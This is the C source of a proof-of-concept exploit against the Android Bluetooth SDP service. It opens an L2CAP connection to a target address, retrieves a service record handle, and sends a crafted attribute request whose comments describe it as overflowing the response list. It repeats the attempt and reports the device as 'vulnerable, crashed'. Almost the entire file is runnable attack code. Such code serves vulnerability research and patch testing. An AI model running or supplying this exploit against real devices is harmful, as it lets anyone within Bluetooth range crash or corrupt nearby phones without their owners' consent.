/***
***Only for android devices***
usage:
$ gcc -o poc poc.c -lbluetooth
$ sudo ./poc addr
***/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>          
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/l2cap.h>

#define __u8 unsigned char
#define __le16 unsigned short
#define __le32 unsigned int
#define __u16 unsigned short
struct l2cap_cmd_hdr {
	__u8       code;
	__u8       ident;
	__le16     len;
};

typedef struct
{
	uint16_t event;
	uint16_t len;
	uint16_t offset;
	uint16_t layer_spec;
	uint8_t data[];
} BT_HDR;

typedef struct sdp_pdu_hdr{
	uint8_t  pdu_id;
	uint16_t tid;
	uint16_t plen;
} __attribute__ ((packed)) sdp_pdu_hdr_t;


#define HEAD_LEN (sizeof(struct l2cap_cmd_hdr))
#define SDP_PDU_SERVICE_ATTR_REQ             0x04
#define  SDP_PDU_SERVICE_SEARCH_REQ          0x02

static int create_sdp_service_search_req(void *buffer, __le16 data_len, void *data){
	sdp_pdu_hdr_t pdu_head;
	__le16 tmp;
	
	memset(&pdu_head, 0, sizeof(pdu_head));
	pdu_head.pdu_id = SDP_PDU_SERVICE_SEARCH_REQ;
	pdu_head.tid = 0;
	tmp = ((data_len & 0xff) << 8 ) + ((data_len >> 8) & 0xff);
	pdu_head.plen = tmp;

	memcpy(buffer, &pdu_head, sizeof(pdu_head));
	memcpy(buffer + sizeof(pdu_head), data, data_len);
	return data_len + sizeof(pdu_head);
}


static int create_sdp_pdu_service_attr_req(void *buffer, __le16 data_len, void *data){
	sdp_pdu_hdr_t pdu_head;
	__le16 tmp;
	
	memset(&pdu_head, 0, sizeof(pdu_head));
	pdu_head.pdu_id = SDP_PDU_SERVICE_ATTR_REQ;
	pdu_head.tid = 0;
	tmp = ((data_len & 0xff) << 8 ) + ((data_len >> 8) & 0xff);
	pdu_head.plen = tmp;

	memcpy(buffer, &pdu_head, sizeof(pdu_head));
	memcpy(buffer + sizeof(pdu_head), data, data_len);
	return data_len + sizeof(pdu_head);
}


static int l2cap_set_mtu(int sock_fd, __le16 imtu, __le32 omtu) {
	int ret;
	struct l2cap_options option_arg;
	socklen_t len ;
	memset(&option_arg, 0 ,sizeof(option_arg));

	ret = getsockopt(sock_fd, SOL_L2CAP, L2CAP_OPTIONS, &option_arg, &len);
	if(ret == -1){
		perror("[*] getsockopt failed : ");
		return -1;
	}

	option_arg.imtu = imtu;
	option_arg.omtu = omtu;

	ret = setsockopt(sock_fd, SOL_L2CAP, L2CAP_OPTIONS, &option_arg, sizeof(option_arg));
	if(ret == -1){
		perror("[*] setsockopt failed : ");
		return -1;
	}
	return 0;
}

// static int send_first_req(int sock_fd){
// 	void *buf, *data, *p;
// 	int total_len;
// 	__le32 rec_handle;

// 	p = data = mallo(0x100);
// 	memset(data, 0, 0x100);

// 	rec_handle = 0x10000; // rec_handle
// 	memcpy(p, &rec_handle, 4);
// 	p += 4;

// 	__le16 max_list_len  = 0x03;  // to make rem_len <= 0, break for loop
// 	memcpy(p, &max_list_len, 2);
// 	p += 2;

// 	memcpy(p, "\x35\x03\x19\x01\x00", 5); // seq_attr
// 	p += 5;

// 	memcpy(p, "\x00", 1); // CONTINUATION_STATE
// 	p += 1;

// 	buf = malloc(0x100);
// 	memset(buf, 0, 0x100);

// 	total_len = create_sdp_pdu_service_attr_req(buf, p - data, data);
// 	send(sock_fd, buf, total_len, 0);

// 	free(buf);
// 	free(data);
// }


static void show_data(void *data, int len){
	int i;
	unsigned int *p = (unsigned int *)data;
	for(i = 0; i < len ; i++) {
		if(i % 4 == 0)
			printf("%08x : ", i/4 * 0x10);
		printf("%08x " ,p[i]);
		if(i % 4 == 3)
			printf("\n");
	}
}


static int send_service_search_req(int sock_fd){
	void *buf;
	char data[] = 	"\x35\x03\x19\x01\x00" // L2CAP PATTERN
					"\x00\x10"  //max reply
					"\x00";  // CONTINUATION STATE
	int total_len;

	buf = malloc(0x100);
	memset(buf, 0, 0x100);
	total_len = create_sdp_service_search_req(buf, sizeof(data) - 1, data);
	send(sock_fd, buf, total_len, 0);
	free(buf);
}


static __le32 get_record_handle(int sock_fd)
{   
	send_service_search_req(sock_fd);

	void *recv_buf;
	__u8 state;
	__le16 cur_handles, cont_offset;
	__le32 record_handle = 0;
	int ret;

	recv_buf = malloc(0x1000);
	memset(recv_buf, 0, 0x1000);
	ret = recv(sock_fd, recv_buf, 0x1000, 0);
	if(ret == -1 || ret < 30) {
		perror("[*] recv record_handle : ");
		goto end;
	}

	// memcpy(&cur_handles, recv_buf + 28, 2);

	// printf("[*] cur_handles = %x\n", cur_handles);

	for (void * p = recv_buf+ret - 3 - 4; p > recv_buf; p -= 4)
	{
		memcpy(&record_handle, p, 4);
		if(record_handle > 0) 
		{
			printf("[*] find handle: %08x\n", record_handle);
			break;
		}
	}
end:
	free(recv_buf);
	return record_handle;
}

static int send_trigger_req(int sock_fd, __le32 handle){
	void *buf, *data, *p;
	int total_len;
	__le32 rec_handle;

	p = data = malloc(0x100);
	memset(data, 0, 0x100);

	rec_handle = handle; // rec_handle
	memcpy(p, &rec_handle, 4);
	p += 4;

	__le16 max_list_len  = 0x01;  // to make rem_len <= 0, break for loop, and make p_ccb->rsp_list overflow
	memcpy(p, &max_list_len, 2);
	p += 2;


	memcpy(p, "\x35\x03\x09\x00\x01", 5); // seq_attr
	p += 5;
               
	memcpy(p, "\x00", 1); // CONTINUATION_STATE
	p += 1;

	buf = malloc(0x100);
	memset(buf, 0, 0x100);

	total_len = create_sdp_pdu_service_attr_req(buf, p - data, data);
	send(sock_fd, buf, total_len, 0);

	free(buf);
 	free(data);
}

int main(int argc ,char* argv[]){
	int sock_fd, ret;
	int try_count = 20;
	__le16 cont_offset;
	void *buf, *data, *recv_buf;
	char dest[18];
	struct sockaddr_l2 local_l2_addr;
	struct sockaddr_l2 remote_l2_addr;

	if(argc < 2){
		printf("usage : sudo ./poc TARGET_ADDR\n");
		return -1;
	}
	strncpy(dest, argv[1], 18);

	while( try_count-- > 0 )
	{
		sock_fd = socket(PF_BLUETOOTH, SOCK_STREAM, BTPROTO_L2CAP);
		if(sock_fd == -1){
			perror("[*] socket create failed : ");
			return -1;
		}

		memset(&local_l2_addr, 0, sizeof(struct sockaddr_l2));
		local_l2_addr.l2_family = PF_BLUETOOTH;
		memcpy(&local_l2_addr.l2_bdaddr , BDADDR_ANY, sizeof(bdaddr_t));


		ret = bind(sock_fd, (struct sockaddr*) &local_l2_addr, sizeof(struct sockaddr_l2));
		if(ret == -1){
			perror("[*] bind()");
			goto out;
		}


		l2cap_set_mtu(sock_fd, 48, 48);

		memset(&remote_l2_addr, 0, sizeof(remote_l2_addr));
		remote_l2_addr.l2_family = PF_BLUETOOTH;
		remote_l2_addr.l2_psm = htobs(0x1);
		str2ba(dest, &remote_l2_addr.l2_bdaddr);

		if(connect(sock_fd, (struct sockaddr *) &remote_l2_addr,sizeof(remote_l2_addr)) < 0) {  
	  		perror("[*] can't connect");
	  		if(errno == 100)
	  			goto vul;
			goto next;
		} 

		sleep(2);

		__le32 record_handle = get_record_handle(sock_fd);

		sleep(1);

		send_trigger_req(sock_fd, record_handle);
		
	next:
		close(sock_fd);
	}

out:
	close(sock_fd);
	return 0;
vul:
	close(sock_fd);
	printf("[+]device is vulnerable, crashed!\n");
	return 0; 
}